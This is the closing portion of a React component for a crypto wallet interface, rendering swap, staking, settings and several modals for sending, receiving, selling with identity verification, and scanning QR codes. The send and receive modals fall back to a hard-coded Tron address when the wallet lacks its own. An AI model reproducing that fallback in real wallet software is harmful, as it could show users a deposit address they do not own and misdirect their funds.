              onSelectToken={(token) => setSelectedTokenDetail(token)}
              onOpenManageTokens={() => setModalManageTokens(true)}
            />
          </div>
        )}

        {activeTab === 'swap' && (() => {
          // Calculate available balances for swap (subtract staked amounts)
          const stakedBySymbol: Record<string, number> = {};
          activeDeposits.forEach((dep) => {
            stakedBySymbol[dep.tokenSymbol] = (stakedBySymbol[dep.tokenSymbol] || 0) + dep.amount;
          });
          
          const availableTokens = tokens.map((t) => {
            const stakedAmount = stakedBySymbol[t.symbol] || 0;
            const availableBalance = Math.max(0, t.balance - stakedAmount);
            return {
              ...t,
              balance: availableBalance,
              balanceUsd: availableBalance * t.price
            };
          });
          
          return (
            <SwapTab
              tokens={availableTokens}
              walletAddress={currentWallet?.address}
              onSwapSuccess={handleSwapSuccess}
            />
          );
        })()}

        {activeTab === 'earn' && (
          <EarnTab
            tokens={tokens}
            activeDeposits={activeDeposits}
            proPositions={proPositions}
            proAssets={proAssets}
            availableBalanceUsd={tradeCollateralAvailableUsd}
            unlockPeriodHours={unlockPeriodHours}
            onDepositSuccess={handleClassicDepositSuccess}
            onUnstakeSuccess={handleClassicUnstakeSuccess}
            onUnstakeRequest={handleUnstakeRequest}
            onOpenPosition={handleOpenProPosition}
            onClosePosition={handleCloseProPosition}
            onUpdateTpSl={handleUpdateProTpSl}
          />
        )}

        {activeTab === 'settings' && (
          <SettingsTab
            currentWallet={currentWallet}
            onOpenWalletDetails={() => setModalWalletSwitcher(true)}
            onLockApp={() => setIsLocked(true)}
            onResetWallet={handleResetWallet}
            savedPin={pinCode}
            onUpdatePin={handleUpdatePin}
            fiatCurrency={fiatCurrency}
            onFiatCurrencyChange={setFiatCurrency}
          />
        )}
      </div>

      {/* Bottom Navigation Bar */}
      <BottomNavBar
        activeTab={activeTab}
        onChangeTab={(tab) => setActiveTab(tab)}
      />

      {/* MODALS */}
      {/* 1. Token Detail View */}
      {activeDetailToken && (
        <TokenDetailModal
          token={activeDetailToken}
          onClose={() => setSelectedTokenDetail(null)}
          onOpenSend={(tok) => {
            setSelectedTokenDetail(null);
            setModalSend({ open: true, initialToken: tok });
          }}
          onOpenReceive={(tok) => {
            setSelectedTokenDetail(null);
            setModalReceive({ open: true, initialToken: tok });
          }}
          onOpenSwap={() => {
            setSelectedTokenDetail(null);
            setActiveTab('swap');
          }}
        />
      )}

      {/* 2. Send Modal */}
      {modalSend.open && (() => {
        // Calculate available balances (subtract staked amounts)
        const stakedBySymbol: Record<string, number> = {};
        activeDeposits.forEach((dep) => {
          const key = dep.tokenSymbol;
          stakedBySymbol[key] = (stakedBySymbol[key] || 0) + dep.amount;
        });
        
        const availableTokens = tokens.map((t) => {
          const stakedAmount = stakedBySymbol[t.symbol] || 0;
          const availableBalance = Math.max(0, t.balance - stakedAmount);
          return {
            ...t,
            balance: availableBalance,
            balanceUsd: availableBalance * t.price,
            _stakedAmount: stakedAmount // Keep track for display
          };
        });
        
        return (
          <SendModal
            tokens={availableTokens}
            initialToken={modalSend.initialToken}
            walletAddress={currentWallet.address}
            tronAddress={currentWallet.tronAddress || 'TYDZSxdvjW6H8HkWtK5J92mNqP7rS8tVwX'}
            fiatCurrency={fiatCurrency}
            onClose={() => setModalSend({ open: false })}
            onSendSuccess={handleSendSuccess}
          />
        );
      })()}

      {/* 3. Receive Modal */}
      {modalReceive.open && (
        <ReceiveModal
          tokens={tokens}
          initialToken={modalReceive.initialToken}
          walletAddress={currentWallet.address}
          tronAddress={currentWallet.tronAddress || 'TYDZSxdvjW6H8HkWtK5J92mNqP7rS8tVwX'}
          onClose={() => setModalReceive({ open: false })}
        />
      )}

      {/* 4. Sell Crypto Modal */}
      {modalSell && (
        <SellModal
          tokens={tokens}
          walletAddress={currentWallet.address}
          isVerified={isVerified}
          onClose={() => setModalSell(false)}
          onSellSuccess={handleSellSuccess}
          onVerificationSubmit={handleVerificationSubmit}
        />
      )}

      {showVerificationModal && (
        <SellModal
          tokens={tokens}
          walletAddress={currentWallet.address}
          isVerified={false}
          onClose={() => setShowVerificationModal(false)}
          onSellSuccess={handleSellSuccess}
          onVerificationSubmit={(data) => {
            handleVerificationSubmit(data);
            setShowVerificationModal(false);
          }}
        />
      )}

      {showActivityModal && (
        <ActivityModal
          items={activityItems}
          onMarkAsRead={(id) => setActivityItems(prev => prev.map(i => i.id === id ? { ...i, read: true } : i))}
          onOpenSupport={() => {
            setShowActivityModal(false);
            setActiveTab('settings'); // Navigate to settings where support is
          }}
          onClose={() => setShowActivityModal(false)}
        />
      )}

      {/* 5. Wallet Details Modal (1 Phone = 1 Wallet rule) */}
      {modalWalletSwitcher && (
        <WalletDetailsModal
          wallet={currentWallet}
          onLockApp={() => setIsLocked(true)}
          onResetWallet={handleResetWallet}
          onClose={() => setModalWalletSwitcher(false)}
          verificationStatus={verificationStatus}
          onOpenVerification={() => {
            setModalWalletSwitcher(false);
            setShowVerificationModal(true);
          }}
        />
      )}

      {/* 6. Network Filter Modal */}
      {modalNetworkFilter && (
        <NetworkFilterModal
          currentNetwork={currentNetwork}
          onSelectNetwork={(net) => setCurrentNetwork(net)}
          onClose={() => setModalNetworkFilter(false)}
        />
      )}

      {/* 7. QR Scanner Modal */}
      {modalQRScanner && (
        <QRScannerModal
          onScanResult={(addr) => {
            setModalSend({ open: true });
          }}
          onClose={() => setModalQRScanner(false)}
        />
      )}

      {/* 8. Notifications Modal */}
      {modalNotifications && (
        <NotificationsModal
          notifications={notifications}
          onMarkAllAsRead={() => {
            setNotifications((prev) => prev.map((n) => ({ ...n, read: true })));
          }}
          onClose={() => setModalNotifications(false)}
        />
      )}

      {/* 9. Manage Tokens Modal */}
      {modalManageTokens && (
        <ManageTokensModal
          tokens={INITIAL_TOKENS}
          activeTokenIds={tokens.map((t) => t.id)}
          onAddCustomToken={handleAddCustomToken}
          onToggleTokens={handleToggleTokens}
          onClose={() => setModalManageTokens(false)}
        />
      )}
    </AndroidFrame>
  );
}
